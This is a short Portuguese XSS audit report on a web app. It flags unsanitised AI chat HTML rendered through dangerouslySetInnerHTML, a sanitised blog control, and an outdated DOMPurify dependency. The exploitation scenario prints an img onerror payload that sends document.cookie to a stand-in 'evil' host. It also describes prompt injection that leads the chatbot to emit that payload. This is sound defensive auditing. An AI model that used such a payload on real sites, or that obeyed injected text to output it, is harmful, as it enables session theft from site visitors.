# Auditoria XSS

**Data:** 22/06/2026

## Vulnerabilidade 1 — HTML do chat sem sanitização

**Classificação:** ALTO

**Localização:**
- Arquivo: `src/modules/chat/presentation/components/ChatWidget/MessageBubble.tsx`
- Linha: 52-56
- Função: `MessageBubble`

**Evidência:**

```tsx
{message.contentHtml ? (
  <div
    className="text-sm prose prose-sm max-w-none"
    dangerouslySetInnerHTML={{ __html: message.contentHtml }}
  />
) : (
```

**Risco:** Se N8N/OpenAI retornar HTML malicioso ou canal comprometido, script executa no browser do visitante (session hijack, keylogging).

**Cenário de Exploração:** Prompt injection no chat → resposta com `<img onerror="fetch('https://evil?c='+document.cookie)">`.

**Recomendação:** Sanitizar com DOMPurify antes de renderizar, igual ao blog.

---

## Positivo — Blog sanitizado

**Classificação:** Controle existente

**Localização:** `pages/BlogPostDetail.tsx` linhas 214-217

**Evidência:**

```tsx
dangerouslySetInnerHTML={{
  __html: DOMPurify.sanitize(post.content || ""),
}}
```

## Dependência DOMPurify desatualizada

**Classificação:** MÉDIO

`npm audit` reporta bypasses em `dompurify` ≤3.3.3 (transitivo). Atualizar `isomorphic-dompurify`.
